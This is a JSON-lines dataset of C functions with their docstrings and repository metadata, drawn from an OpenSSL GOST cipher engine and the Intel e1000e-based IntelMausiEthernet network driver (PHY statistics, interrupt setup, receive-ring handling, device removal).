{"docstring": "/* Retrieve 256-bit key from context */\n", "func_signal": "void gost_get_key(gost_ctx * c, byte * k)", "code": "{\n    int i, j;\n    for (i = 0, j = 0; i < 8; i++, j += 4) {\n        k[j] = (byte) (c->k[i] & 0xFF);\n        k[j + 1] = (byte) ((c->k[i] >> 8) & 0xFF);\n        k[j + 2] = (byte) ((c->k[i] >> 16) & 0xFF);\n        k[j + 3] = (byte) ((c->k[i] >> 24) & 0xFF);\n    }\n}", "path": "src\\nginx\\objs\\lib_x64\\openssl\\engines\\ccgost\\gost89.c", "repo_name": "LomoX-Offical/nginx-openresty-windows", "stars": 414, "license": "None", "language": "c", "size": 131272}
{"docstring": "/* Decrypts several full blocks in CFB mode using 8byte IV */\n", "func_signal": "void gost_dec_cfb(gost_ctx * ctx, const byte * iv, const byte * cipher,\n                  byte * clear, int blocks)", "code": "{\n    byte cur_iv[8];\n    byte gamma[8];\n    int i, j;\n    const byte *in;\n    byte *out;\n    memcpy(cur_iv, iv, 8);\n    for (i = 0, in = cipher, out = clear; i < blocks; i++, in += 8, out += 8) {\n        gostcrypt(ctx, cur_iv, gamma);\n        for (j = 0; j < 8; j++) {\n            out[j] = (cur_iv[j] = in[j]) ^ gamma[j];\n        }\n    }\n}", "path": "src\\nginx\\objs\\lib_x64\\openssl\\engines\\ccgost\\gost89.c", "repo_name": "LomoX-Offical/nginx-openresty-windows", "stars": 414, "license": "None", "language": "c", "size": 131272}
{"docstring": "/**\n * e1000e_update_phy_stats - Update the PHY statistics counters\n * @adapter: board private structure\n *\n * Read/clear the upper 16-bit PHY registers and read/accumulate lower\n **/\n", "func_signal": "void e1000e_update_phy_stats(struct e1000_adapter *adapter)", "code": "{\n\tstruct e1000_hw *hw = &adapter->hw;\n\ts32 ret_val;\n\tu16 phy_data;\n\n\tret_val = hw->phy.ops.acquire(hw);\n\tif (ret_val)\n\t\treturn;\n\n\t/* A page set is expensive so check if already on desired page.\n\t * If not, set to the page with the PHY status registers.\n\t */\n\thw->phy.addr = 1;\n\tret_val = e1000e_read_phy_reg_mdic(hw, IGP01E1000_PHY_PAGE_SELECT,\n\t\t\t\t\t   &phy_data);\n\tif (ret_val)\n\t\tgoto release;\n\tif (phy_data != (HV_STATS_PAGE << IGP_PAGE_SHIFT)) {\n\t\tret_val = hw->phy.ops.set_page(hw,\n\t\t\t\t\t       HV_STATS_PAGE << IGP_PAGE_SHIFT);\n\t\tif (ret_val)\n\t\t\tgoto release;\n\t}\n\n\t/* Single Collision Count */\n\thw->phy.ops.read_reg_page(hw, HV_SCC_UPPER, &phy_data);\n\tret_val = hw->phy.ops.read_reg_page(hw, HV_SCC_LOWER, &phy_data);\n\tif (!ret_val)\n\t\tadapter->stats.scc += phy_data;\n\n\t/* Excessive Collision Count */\n\thw->phy.ops.read_reg_page(hw, HV_ECOL_UPPER, &phy_data);\n\tret_val = hw->phy.ops.read_reg_page(hw, HV_ECOL_LOWER, &phy_data);\n\tif (!ret_val)\n\t\tadapter->stats.ecol += phy_data;\n\n\t/* Multiple Collision Count */\n\thw->phy.ops.read_reg_page(hw, HV_MCC_UPPER, &phy_data);\n\tret_val = hw->phy.ops.read_reg_page(hw, HV_MCC_LOWER, &phy_data);\n\tif (!ret_val)\n\t\tadapter->stats.mcc += phy_data;\n\n\t/* Late Collision Count */\n\thw->phy.ops.read_reg_page(hw, HV_LATECOL_UPPER, &phy_data);\n\tret_val = hw->phy.ops.read_reg_page(hw, HV_LATECOL_LOWER, &phy_data);\n\tif (!ret_val)\n\t\tadapter->stats.latecol += phy_data;\n\n\t/* Collision Count - also used for adaptive IFS */\n\thw->phy.ops.read_reg_page(hw, HV_COLC_UPPER, &phy_data);\n\tret_val = hw->phy.ops.read_reg_page(hw, HV_COLC_LOWER, &phy_data);\n\tif (!ret_val)\n\t\thw->mac.collision_delta = phy_data;\n\n\t/* Defer Count */\n\thw->phy.ops.read_reg_page(hw, HV_DC_UPPER, &phy_data);\n\tret_val = hw->phy.ops.read_reg_page(hw, HV_DC_LOWER, &phy_data);\n\tif (!ret_val)\n\t\tadapter->stats.dc += phy_data;\n\n\t/* Transmit with no CRS */\n\thw->phy.ops.read_reg_page(hw, HV_TNCRS_UPPER, &phy_data);\n\tret_val = hw->phy.ops.read_reg_page(hw, HV_TNCRS_LOWER, &phy_data);\n\tif (!ret_val)\n\t\tadapter->stats.tncrs += phy_data;\n\nrelease:\n\thw->phy.ops.release(hw);\n}", "path": "IntelMausiEthernet\\netdev.c", "repo_name": "Mieze/IntelMausiEthernet", "stars": 396, "license": "None", "language": "c", "size": 570}
{"docstring": "/**\n * e1000e_update_phy_task - work thread to update phy\n * @work: pointer to our work struct\n *\n * this worker thread exists because we must acquire a\n * semaphore to read the phy, which we could msleep while\n * waiting for it, and we can't msleep in a timer.\n **/\n", "func_signal": "static void e1000e_update_phy_task(struct work_struct *work)", "code": "{\n\tstruct e1000_adapter *adapter = container_of(work,\n\t\t\t\t\t\t     struct e1000_adapter,\n\t\t\t\t\t\t     update_phy_task);\n\tstruct e1000_hw *hw = &adapter->hw;\n\n\tif (test_bit(__E1000_DOWN, &adapter->state))\n\t\treturn;\n\n\te1000_get_phy_info(hw);\n\n\t/* Enable EEE on 82579 after link up */\n\tif (hw->phy.type >= e1000_phy_82579)\n\t\te1000_set_eee_pchlan(hw);\n}", "path": "IntelMausiEthernet\\netdev.c", "repo_name": "Mieze/IntelMausiEthernet", "stars": 396, "license": "None", "language": "c", "size": 570}
{"docstring": "/**\n * e1000_update_phy_info - timre call-back to update PHY info\n * @data: pointer to adapter cast into an unsigned long\n *\n * Need to wait a few seconds after link up to get diagnostic information from\n * the phy\n **/\n", "func_signal": "static void e1000_update_phy_info(struct timer_list *t)", "code": "{\n\tstruct e1000_adapter *adapter = from_timer(adapter, t, phy_info_timer);\n\n\tif (test_bit(__E1000_DOWN, &adapter->state))\n\t\treturn;\n\n\tschedule_work(&adapter->update_phy_task);\n}", "path": "IntelMausiEthernet\\netdev.c", "repo_name": "Mieze/IntelMausiEthernet", "stars": 396, "license": "None", "language": "c", "size": 570}
{"docstring": "/**\n * e1000_request_msix - Initialize MSI-X interrupts\n *\n * e1000_request_msix allocates MSI-X vectors and requests interrupts from the\n * kernel.\n **/\n", "func_signal": "static int e1000_request_msix(struct e1000_adapter *adapter)", "code": "{\n\tstruct net_device *netdev = adapter->netdev;\n\tint err = 0, vector = 0;\n\n\tif (strlen(netdev->name) < (IFNAMSIZ - 5))\n\t\tsnprintf(adapter->rx_ring->name,\n\t\t\t sizeof(adapter->rx_ring->name) - 1,\n\t\t\t \"%s-rx-0\", netdev->name);\n\telse\n\t\tmemcpy(adapter->rx_ring->name, netdev->name, IFNAMSIZ);\n\terr = request_irq(adapter->msix_entries[vector].vector,\n\t\t\t  e1000_intr_msix_rx, 0, adapter->rx_ring->name,\n\t\t\t  netdev);\n\tif (err)\n\t\treturn err;\n\tadapter->rx_ring->itr_register = adapter->hw.hw_addr +\n\t    E1000_EITR_82574(vector);\n\tadapter->rx_ring->itr_val = adapter->itr;\n\tvector++;\n\n\tif (strlen(netdev->name) < (IFNAMSIZ - 5))\n\t\tsnprintf(adapter->tx_ring->name,\n\t\t\t sizeof(adapter->tx_ring->name) - 1,\n\t\t\t \"%s-tx-0\", netdev->name);\n\telse\n\t\tmemcpy(adapter->tx_ring->name, netdev->name, IFNAMSIZ);\n\terr = request_irq(adapter->msix_entries[vector].vector,\n\t\t\t  e1000_intr_msix_tx, 0, adapter->tx_ring->name,\n\t\t\t  netdev);\n\tif (err)\n\t\treturn err;\n\tadapter->tx_ring->itr_register = adapter->hw.hw_addr +\n\t    E1000_EITR_82574(vector);\n\tadapter->tx_ring->itr_val = adapter->itr;\n\tvector++;\n\n\terr = request_irq(adapter->msix_entries[vector].vector,\n\t\t\t  e1000_msix_other, 0, netdev->name, netdev);\n\tif (err)\n\t\treturn err;\n\n\te1000_configure_msix(adapter);\n\n\treturn 0;\n}", "path": "IntelMausiEthernet\\netdev.c", "repo_name": "Mieze/IntelMausiEthernet", "stars": 396, "license": "None", "language": "c", "size": 570}
{"docstring": "/**\n * e1000_flush_rx_ring - remove all descriptors from the rx_ring\n *\n * Mark all descriptors in the RX ring as consumed and disable the rx ring\n */\n", "func_signal": "static void e1000_flush_rx_ring(struct e1000_adapter *adapter)", "code": "{\n\tu32 rctl, rxdctl;\n\tstruct e1000_hw *hw = &adapter->hw;\n\n\trctl = er32(RCTL);\n\tew32(RCTL, rctl & ~E1000_RCTL_EN);\n\te1e_flush();\n\tusleep_range(100, 150);\n\n\trxdctl = er32(RXDCTL(0));\n\t/* zero the lower 14 bits (prefetch and host thresholds) */\n\trxdctl &= 0xffffc000;\n\n\t/* update thresholds: prefetch threshold to 31, host threshold to 1\n\t * and make sure the granularity is \"descriptors\" and not \"cache lines\"\n\t */\n\trxdctl |= (0x1F | BIT(8) | E1000_RXDCTL_THRESH_UNIT_DESC);\n\n\tew32(RXDCTL(0), rxdctl);\n\t/* momentarily enable the RX ring for the changes to take effect */\n\tew32(RCTL, rctl | E1000_RCTL_EN);\n\te1e_flush();\n\tusleep_range(100, 150);\n\tew32(RCTL, rctl & ~E1000_RCTL_EN);\n}", "path": "IntelMausiEthernet\\netdev.c", "repo_name": "Mieze/IntelMausiEthernet", "stars": 396, "license": "None", "language": "c", "size": 570}
{"docstring": "/**\n * e1000e_cyclecounter_read - read raw cycle counter (used by time counter)\n * @cc: cyclecounter structure\n **/\n", "func_signal": "static u64 e1000e_cyclecounter_read(const struct cyclecounter *cc)", "code": "{\n\tstruct e1000_adapter *adapter = container_of(cc, struct e1000_adapter,\n\t\t\t\t\t\t     cc);\n\tstruct e1000_hw *hw = &adapter->hw;\n\tu32 systimel, systimeh;\n\tu64 systim;\n\t/* SYSTIMH latching upon SYSTIML read does not work well.\n\t * This means that if SYSTIML overflows after we read it but before\n\t * we read SYSTIMH, the value of SYSTIMH has been incremented and we\n\t * will experience a huge non linear increment in the systime value\n\t * to fix that we test for overflow and if true, we re-read systime.\n\t */\n\tsystimel = er32(SYSTIML);\n\tsystimeh = er32(SYSTIMH);\n\t/* Is systimel is so large that overflow is possible? */\n\tif (systimel >= (u32)0xffffffff - E1000_TIMINCA_INCVALUE_MASK) {\n\t\tu32 systimel_2 = er32(SYSTIML);\n\t\tif (systimel > systimel_2) {\n\t\t\t/* There was an overflow, read again SYSTIMH, and use\n\t\t\t * systimel_2\n\t\t\t */\n\t\t\tsystimeh = er32(SYSTIMH);\n\t\t\tsystimel = systimel_2;\n\t\t}\n\t}\n\tsystim = (u64)systimel;\n\tsystim |= (u64)systimeh << 32;\n\n\tif (adapter->flags2 & FLAG2_CHECK_SYSTIM_OVERFLOW)\n\t\tsystim = e1000e_sanitize_systim(hw, systim);\n\n\treturn systim;\n}", "path": "IntelMausiEthernet\\netdev.c", "repo_name": "Mieze/IntelMausiEthernet", "stars": 396, "license": "None", "language": "c", "size": 570}
{"docstring": "/**\n * e1000_configure_rx - Configure Receive Unit after Reset\n * @adapter: board private structure\n *\n * Configure the Rx unit of the MAC after a reset.\n **/\n", "func_signal": "static void e1000_configure_rx(struct e1000_adapter *adapter)", "code": "{\n\tstruct e1000_hw *hw = &adapter->hw;\n\tstruct e1000_ring *rx_ring = adapter->rx_ring;\n\tu64 rdba;\n\tu32 rdlen, rctl, rxcsum, ctrl_ext;\n\n\tif (adapter->rx_ps_pages) {\n\t\t/* this is a 32 byte descriptor */\n\t\trdlen = rx_ring->count *\n\t\t    sizeof(union e1000_rx_desc_packet_split);\n\t\tadapter->clean_rx = e1000_clean_rx_irq_ps;\n\t\tadapter->alloc_rx_buf = e1000_alloc_rx_buffers_ps;\n\t} else if (adapter->netdev->mtu > ETH_FRAME_LEN + ETH_FCS_LEN) {\n\t\trdlen = rx_ring->count * sizeof(union e1000_rx_desc_extended);\n\t\tadapter->clean_rx = e1000_clean_jumbo_rx_irq;\n\t\tadapter->alloc_rx_buf = e1000_alloc_jumbo_rx_buffers;\n\t} else {\n\t\trdlen = rx_ring->count * sizeof(union e1000_rx_desc_extended);\n\t\tadapter->clean_rx = e1000_clean_rx_irq;\n\t\tadapter->alloc_rx_buf = e1000_alloc_rx_buffers;\n\t}\n\n\t/* disable receives while setting up the descriptors */\n\trctl = er32(RCTL);\n\tif (!(adapter->flags2 & FLAG2_NO_DISABLE_RX))\n\t\tew32(RCTL, rctl & ~E1000_RCTL_EN);\n\te1e_flush();\n\tusleep_range(10000, 20000);\n\n\tif (adapter->flags2 & FLAG2_DMA_BURST) {\n\t\t/* set the writeback threshold (only takes effect if the RDTR\n\t\t * is set). set GRAN=1 and write back up to 0x4 worth, and\n\t\t * enable prefetching of 0x20 Rx descriptors\n\t\t * granularity = 01\n\t\t * wthresh = 04,\n\t\t * hthresh = 04,\n\t\t * pthresh = 0x20\n\t\t */\n\t\tew32(RXDCTL(0), E1000_RXDCTL_DMA_BURST_ENABLE);\n\t\tew32(RXDCTL(1), E1000_RXDCTL_DMA_BURST_ENABLE);\n\t}\n\n\t/* set the Receive Delay Timer Register */\n\tew32(RDTR, adapter->rx_int_delay);\n\n\t/* irq moderation */\n\tew32(RADV, adapter->rx_abs_int_delay);\n\tif ((adapter->itr_setting != 0) && (adapter->itr != 0))\n\t\te1000e_write_itr(adapter, adapter->itr);\n\n\tctrl_ext = er32(CTRL_EXT);\n\t/* Auto-Mask interrupts upon ICR access */\n\tctrl_ext |= E1000_CTRL_EXT_IAME;\n\tew32(IAM, 0xffffffff);\n\tew32(CTRL_EXT, ctrl_ext);\n\te1e_flush();\n\n\t/* Setup the HW Rx Head and Tail Descriptor Pointers and\n\t * the Base and Length of the Rx Descriptor Ring\n\t */\n\trdba = rx_ring->dma;\n\tew32(RDBAL(0), (rdba & DMA_BIT_MASK(32)));\n\tew32(RDBAH(0), (rdba >> 32));\n\tew32(RDLEN(0), rdlen);\n\tew32(RDH(0), 0);\n\tew32(RDT(0), 0);\n\trx_ring->head = adapter->hw.hw_addr + E1000_RDH(0);\n\trx_ring->tail = adapter->hw.hw_addr + E1000_RDT(0);\n\n\twritel(0, rx_ring->head);\n\tif (adapter->flags2 & FLAG2_PCIM2PCI_ARBITER_WA)\n\t\te1000e_update_rdt_wa(rx_ring, 0);\n\telse\n\t\twritel(0, rx_ring->tail);\n\n\t/* Enable Receive Checksum Offload for TCP and UDP */\n\trxcsum = er32(RXCSUM);\n\tif (adapter->netdev->features & NETIF_F_RXCSUM)\n\t\trxcsum |= E1000_RXCSUM_TUOFL;\n\telse\n\t\trxcsum &= ~E1000_RXCSUM_TUOFL;\n\tew32(RXCSUM, rxcsum);\n\n\t/* With jumbo frames, excessive C-state transition latencies result\n\t * in dropped transactions.\n\t */\n\tif (adapter->netdev->mtu > ETH_DATA_LEN) {\n\t\tu32 lat =\n\t\t    ((er32(PBA) & E1000_PBA_RXA_MASK) * 1024 -\n\t\t     adapter->max_frame_size) * 8 / 1000;\n\n\t\tif (adapter->flags & FLAG_IS_ICH) {\n\t\t\tu32 rxdctl = er32(RXDCTL(0));\n\n\t\t\tew32(RXDCTL(0), rxdctl | 0x3);\n\t\t}\n\n\t\tpm_qos_update_request(&adapter->pm_qos_req, lat);\n\t} else {\n\t\tpm_qos_update_request(&adapter->pm_qos_req,\n\t\t\t\t      PM_QOS_DEFAULT_VALUE);\n\t}\n\n\t/* Enable Receives */\n\tew32(RCTL, rctl);\n}", "path": "IntelMausiEthernet\\netdev.c", "repo_name": "Mieze/IntelMausiEthernet", "stars": 396, "license": "None", "language": "c", "size": 570}
{"docstring": "/**\n * e1000_regdump - register printout routine\n * @hw: pointer to the HW structure\n * @reginfo: pointer to the register info table\n **/\n", "func_signal": "static void e1000_regdump(struct e1000_hw *hw, struct e1000_reg_info *reginfo)", "code": "{\n\tint n = 0;\n\tchar rname[16];\n\tu32 regs[8];\n\n\tswitch (reginfo->ofs) {\n\tcase E1000_RXDCTL(0):\n\t\tfor (n = 0; n < 2; n++)\n\t\t\tregs[n] = __er32(hw, E1000_RXDCTL(n));\n\t\tbreak;\n\tcase E1000_TXDCTL(0):\n\t\tfor (n = 0; n < 2; n++)\n\t\t\tregs[n] = __er32(hw, E1000_TXDCTL(n));\n\t\tbreak;\n\tcase E1000_TARC(0):\n\t\tfor (n = 0; n < 2; n++)\n\t\t\tregs[n] = __er32(hw, E1000_TARC(n));\n\t\tbreak;\n\tdefault:\n\t\tpr_info(\"%-15s %08x\\n\",\n\t\t\treginfo->name, __er32(hw, reginfo->ofs));\n\t\treturn;\n\t}\n\n\tsnprintf(rname, 16, \"%s%s\", reginfo->name, \"[0-1]\");\n\tpr_info(\"%-15s %08x %08x\\n\", rname, regs[0], regs[1]);\n}", "path": "IntelMausiEthernet\\netdev.c", "repo_name": "Mieze/IntelMausiEthernet", "stars": 396, "license": "None", "language": "c", "size": 570}
{"docstring": "/**\n * e1000_alloc_rx_buffers - Replace used receive buffers\n * @rx_ring: Rx descriptor ring\n **/\n", "func_signal": "static void e1000_alloc_rx_buffers(struct e1000_ring *rx_ring,\n\t\t\t\t   int cleaned_count, gfp_t gfp)", "code": "{\n\tstruct e1000_adapter *adapter = rx_ring->adapter;\n\tstruct net_device *netdev = adapter->netdev;\n\tstruct pci_dev *pdev = adapter->pdev;\n\tunion e1000_rx_desc_extended *rx_desc;\n\tstruct e1000_buffer *buffer_info;\n\tstruct sk_buff *skb;\n\tunsigned int i;\n\tunsigned int bufsz = adapter->rx_buffer_len;\n\n\ti = rx_ring->next_to_use;\n\tbuffer_info = &rx_ring->buffer_info[i];\n\n\twhile (cleaned_count--) {\n\t\tskb = buffer_info->skb;\n\t\tif (skb) {\n\t\t\tskb_trim(skb, 0);\n\t\t\tgoto map_skb;\n\t\t}\n\n\t\tskb = __netdev_alloc_skb_ip_align(netdev, bufsz, gfp);\n\t\tif (!skb) {\n\t\t\t/* Better luck next round */\n\t\t\tadapter->alloc_rx_buff_failed++;\n\t\t\tbreak;\n\t\t}\n\n\t\tbuffer_info->skb = skb;\nmap_skb:\n\t\tbuffer_info->dma = dma_map_single(&pdev->dev, skb->data,\n\t\t\t\t\t\t  adapter->rx_buffer_len,\n\t\t\t\t\t\t  DMA_FROM_DEVICE);\n\t\tif (dma_mapping_error(&pdev->dev, buffer_info->dma)) {\n\t\t\tdev_err(&pdev->dev, \"Rx DMA map failed\\n\");\n\t\t\tadapter->rx_dma_failed++;\n\t\t\tbreak;\n\t\t}\n\n\t\trx_desc = E1000_RX_DESC_EXT(*rx_ring, i);\n\t\trx_desc->read.buffer_addr = cpu_to_le64(buffer_info->dma);\n\n\t\tif (unlikely(!(i & (E1000_RX_BUFFER_WRITE - 1)))) {\n\t\t\t/* Force memory writes to complete before letting h/w\n\t\t\t * know there are new descriptors to fetch.  (Only\n\t\t\t * applicable for weak-ordered memory model archs,\n\t\t\t * such as IA-64).\n\t\t\t */\n\t\t\twmb();\n\t\t\tif (adapter->flags2 & FLAG2_PCIM2PCI_ARBITER_WA)\n\t\t\t\te1000e_update_rdt_wa(rx_ring, i);\n\t\t\telse\n\t\t\t\twritel(i, rx_ring->tail);\n\t\t}\n\t\ti++;\n\t\tif (i == rx_ring->count)\n\t\t\ti = 0;\n\t\tbuffer_info = &rx_ring->buffer_info[i];\n\t}\n\n\trx_ring->next_to_use = i;\n}", "path": "IntelMausiEthernet\\netdev.c", "repo_name": "Mieze/IntelMausiEthernet", "stars": 396, "license": "None", "language": "c", "size": 570}
{"docstring": "/**\n * e1000_remove - Device Removal Routine\n * @pdev: PCI device information struct\n *\n * e1000_remove is called by the PCI subsystem to alert the driver\n * that it should release a PCI device.  The could be caused by a\n * Hot-Plug event, or because the driver is going to be removed from\n * memory.\n **/\n", "func_signal": "static void e1000_remove(struct pci_dev *pdev)", "code": "{\n\tstruct net_device *netdev = pci_get_drvdata(pdev);\n\tstruct e1000_adapter *adapter = netdev_priv(netdev);\n\tbool down = test_bit(__E1000_DOWN, &adapter->state);\n\n\te1000e_ptp_remove(adapter);\n\n\t/* The timers may be rescheduled, so explicitly disable them\n\t * from being rescheduled.\n\t */\n\tif (!down)\n\t\tset_bit(__E1000_DOWN, &adapter->state);\n\tdel_timer_sync(&adapter->watchdog_timer);\n\tdel_timer_sync(&adapter->phy_info_timer);\n\n\tcancel_work_sync(&adapter->reset_task);\n\tcancel_work_sync(&adapter->watchdog_task);\n\tcancel_work_sync(&adapter->downshift_task);\n\tcancel_work_sync(&adapter->update_phy_task);\n\tcancel_work_sync(&adapter->print_hang_task);\n\n\tif (adapter->flags & FLAG_HAS_HW_TIMESTAMP) {\n\t\tcancel_work_sync(&adapter->tx_hwtstamp_work);\n\t\tif (adapter->tx_hwtstamp_skb) {\n\t\t\tdev_consume_skb_any(adapter->tx_hwtstamp_skb);\n\t\t\tadapter->tx_hwtstamp_skb = NULL;\n\t\t}\n\t}\n\n\t/* Don't lie to e1000_close() down the road. */\n\tif (!down)\n\t\tclear_bit(__E1000_DOWN, &adapter->state);\n\tunregister_netdev(netdev);\n\n\tif (pci_dev_run_wake(pdev))\n\t\tpm_runtime_get_noresume(&pdev->dev);\n\n\t/* Release control of h/w to f/w.  If f/w is AMT enabled, this\n\t * would have already happened in close and is redundant.\n\t */\n\te1000e_release_hw_control(adapter);\n\n\te1000e_reset_interrupt_capability(adapter);\n\tkfree(adapter->tx_ring);\n\tkfree(adapter->rx_ring);\n\n\tiounmap(adapter->hw.hw_addr);\n\tif ((adapter->hw.flash_address) &&\n\t    (adapter->hw.mac.type < e1000_pch_spt))\n\t\tiounmap(adapter->hw.flash_address);\n\tpci_release_mem_regions(pdev);\n\n\tfree_netdev(netdev);\n\n\t/* AER disable */\n\tpci_disable_pcie_error_reporting(pdev);\n\n\tpci_disable_device(pdev);\n}", "path": "IntelMausiEthernet\\netdev.c", "repo_name": "Mieze/IntelMausiEthernet", "stars": 396, "license": "None", "language": "c", "size": 570}
{"docstring": "/**\n * e1000e_free_rx_resources - Free Rx Resources\n * @rx_ring: Rx descriptor ring\n *\n * Free all receive software resources\n **/\n", "func_signal": "void e1000e_free_rx_resources(struct e1000_ring *rx_ring)", "code": "{\n\tstruct e1000_adapter *adapter = rx_ring->adapter;\n\tstruct pci_dev *pdev = adapter->pdev;\n\tint i;\n\n\te1000_clean_rx_ring(rx_ring);\n\n\tfor (i = 0; i < rx_ring->count; i++)\n\t\tkfree(rx_ring->buffer_info[i].ps_pages);\n\n\tvfree(rx_ring->buffer_info);\n\trx_ring->buffer_info = NULL;\n\n\tdma_free_coherent(&pdev->dev, rx_ring->size, rx_ring->desc,\n\t\t\t  rx_ring->dma);\n\trx_ring->desc = NULL;\n}", "path": "IntelMausiEthernet\\netdev.c", "repo_name": "Mieze/IntelMausiEthernet", "stars": 396, "license": "None", "language": "c", "size": 570}
{"docstring": "/**\n * e1000_set_mac - Change the Ethernet Address of the NIC\n * @netdev: network interface device structure\n * @p: pointer to an address structure\n *\n * Returns 0 on success, negative on failure\n **/\n", "func_signal": "static int e1000_set_mac(struct net_device *netdev, void *p)", "code": "{\n\tstruct e1000_adapter *adapter = netdev_priv(netdev);\n\tstruct e1000_hw *hw = &adapter->hw;\n\tstruct sockaddr *addr = p;\n\n\tif (!is_valid_ether_addr(addr->sa_data))\n\t\treturn -EADDRNOTAVAIL;\n\n\tmemcpy(netdev->dev_addr, addr->sa_data, netdev->addr_len);\n\tmemcpy(adapter->hw.mac.addr, addr->sa_data, netdev->addr_len);\n\n\thw->mac.ops.rar_set(&adapter->hw, adapter->hw.mac.addr, 0);\n\n\tif (adapter->flags & FLAG_RESET_OVERWRITES_LAA) {\n\t\t/* activate the work around */\n\t\te1000e_set_laa_state_82571(&adapter->hw, 1);\n\n\t\t/* Hold a copy of the LAA in RAR[14] This is done so that\n\t\t * between the time RAR[0] gets clobbered  and the time it\n\t\t * gets fixed (in e1000_watchdog), the actual LAA is in one\n\t\t * of the RARs and no incoming packets directed to this port\n\t\t * are dropped. Eventually the LAA will be in RAR[0] and\n\t\t * RAR[14]\n\t\t */\n\t\thw->mac.ops.rar_set(&adapter->hw, adapter->hw.mac.addr,\n\t\t\t\t    adapter->hw.mac.rar_entry_count - 1);\n\t}\n\n\treturn 0;\n}", "path": "IntelMausiEthernet\\netdev.c", "repo_name": "Mieze/IntelMausiEthernet", "stars": 396, "license": "None", "language": "c", "size": 570}
{"docstring": "/**\n * e1000e_set_interrupt_capability - set MSI or MSI-X if supported\n *\n * Attempt to configure interrupts using the best available\n * capabilities of the hardware and kernel.\n **/\n", "func_signal": "void e1000e_set_interrupt_capability(struct e1000_adapter *adapter)", "code": "{\n\tint err;\n\tint i;\n\n\tswitch (adapter->int_mode) {\n\tcase E1000E_INT_MODE_MSIX:\n\t\tif (adapter->flags & FLAG_HAS_MSIX) {\n\t\t\tadapter->num_vectors = 3; /* RxQ0, TxQ0 and other */\n\t\t\tadapter->msix_entries = kcalloc(adapter->num_vectors,\n\t\t\t\t\t\t\tsizeof(struct\n\t\t\t\t\t\t\t       msix_entry),\n\t\t\t\t\t\t\tGFP_KERNEL);\n\t\t\tif (adapter->msix_entries) {\n\t\t\t\tstruct e1000_adapter *a = adapter;\n\n\t\t\t\tfor (i = 0; i < adapter->num_vectors; i++)\n\t\t\t\t\tadapter->msix_entries[i].entry = i;\n\n\t\t\t\terr = pci_enable_msix_range(a->pdev,\n\t\t\t\t\t\t\t    a->msix_entries,\n\t\t\t\t\t\t\t    a->num_vectors,\n\t\t\t\t\t\t\t    a->num_vectors);\n\t\t\t\tif (err > 0)\n\t\t\t\t\treturn;\n\t\t\t}\n\t\t\t/* MSI-X failed, so fall through and try MSI */\n\t\t\te_err(\"Failed to initialize MSI-X interrupts.  Falling back to MSI interrupts.\\n\");\n\t\t\te1000e_reset_interrupt_capability(adapter);\n\t\t}\n\t\tadapter->int_mode = E1000E_INT_MODE_MSI;\n\t\t/* Fall through */\n\tcase E1000E_INT_MODE_MSI:\n\t\tif (!pci_enable_msi(adapter->pdev)) {\n\t\t\tadapter->flags |= FLAG_MSI_ENABLED;\n\t\t} else {\n\t\t\tadapter->int_mode = E1000E_INT_MODE_LEGACY;\n\t\t\te_err(\"Failed to initialize MSI interrupts.  Falling back to legacy interrupts.\\n\");\n\t\t}\n\t\t/* Fall through */\n\tcase E1000E_INT_MODE_LEGACY:\n\t\t/* Don't do anything; this is the system default */\n\t\tbreak;\n\t}\n\n\t/* store the number of vectors being used */\n\tadapter->num_vectors = 1;\n}", "path": "IntelMausiEthernet\\netdev.c", "repo_name": "Mieze/IntelMausiEthernet", "stars": 396, "license": "None", "language": "c", "size": 570}
{"docstring": "/**\n * e1000e_setup_rx_resources - allocate Rx resources (Descriptors)\n * @rx_ring: Rx descriptor ring\n *\n * Returns 0 on success, negative on failure\n **/\n", "func_signal": "int e1000e_setup_rx_resources(struct e1000_ring *rx_ring)", "code": "{\n\tstruct e1000_adapter *adapter = rx_ring->adapter;\n\tstruct e1000_buffer *buffer_info;\n\tint i, size, desc_len, err = -ENOMEM;\n\n\tsize = sizeof(struct e1000_buffer) * rx_ring->count;\n\trx_ring->buffer_info = vzalloc(size);\n\tif (!rx_ring->buffer_info)\n\t\tgoto err;\n\n\tfor (i = 0; i < rx_ring->count; i++) {\n\t\tbuffer_info = &rx_ring->buffer_info[i];\n\t\tbuffer_info->ps_pages = kcalloc(PS_PAGE_BUFFERS,\n\t\t\t\t\t\tsizeof(struct e1000_ps_page),\n\t\t\t\t\t\tGFP_KERNEL);\n\t\tif (!buffer_info->ps_pages)\n\t\t\tgoto err_pages;\n\t}\n\n\tdesc_len = sizeof(union e1000_rx_desc_packet_split);\n\n\t/* Round up to nearest 4K */\n\trx_ring->size = rx_ring->count * desc_len;\n\trx_ring->size = ALIGN(rx_ring->size, 4096);\n\n\terr = e1000_alloc_ring_dma(adapter, rx_ring);\n\tif (err)\n\t\tgoto err_pages;\n\n\trx_ring->next_to_clean = 0;\n\trx_ring->next_to_use = 0;\n\trx_ring->rx_skb_top = NULL;\n\n\treturn 0;\n\nerr_pages:\n\tfor (i = 0; i < rx_ring->count; i++) {\n\t\tbuffer_info = &rx_ring->buffer_info[i];\n\t\tkfree(buffer_info->ps_pages);\n\t}\nerr:\n\tvfree(rx_ring->buffer_info);\n\te_err(\"Unable to allocate memory for the receive descriptor ring\\n\");\n\treturn err;\n}", "path": "IntelMausiEthernet\\netdev.c", "repo_name": "Mieze/IntelMausiEthernet", "stars": 396, "license": "None", "language": "c", "size": 570}
{"docstring": "/* CONFIG_PM_SLEEP */\n", "func_signal": "static int e1000e_pm_runtime_idle(struct device *dev)", "code": "{\n\tstruct pci_dev *pdev = to_pci_dev(dev);\n\tstruct net_device *netdev = pci_get_drvdata(pdev);\n\tstruct e1000_adapter *adapter = netdev_priv(netdev);\n\tu16 eee_lp;\n\n\teee_lp = adapter->hw.dev_spec.ich8lan.eee_lp_ability;\n\n\tif (!e1000e_has_link(adapter)) {\n\t\tadapter->hw.dev_spec.ich8lan.eee_lp_ability = eee_lp;\n\t\tpm_schedule_suspend(dev, 5 * MSEC_PER_SEC);\n\t}\n\n\treturn -EBUSY;\n}", "path": "IntelMausiEthernet\\netdev.c", "repo_name": "Mieze/IntelMausiEthernet", "stars": 396, "license": "None", "language": "c", "size": 570}
